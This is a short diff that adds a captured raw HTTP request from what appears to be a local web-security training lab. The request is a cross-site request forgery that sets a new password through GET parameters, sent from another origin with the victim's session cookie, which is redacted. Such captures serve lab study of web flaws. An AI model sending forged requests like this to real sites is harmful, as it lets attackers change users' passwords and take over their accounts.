@@ -1,0 +1,7 @@
+GET /vulnerabilities/csrf/?password_new=9083&password_conf=9083&Change=Change HTTP/1.1
+Host: 127.0.0.1:4280
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Dest: document
+Referer: http://127.0.0.1:8084/
+Cookie: [REDACTED]
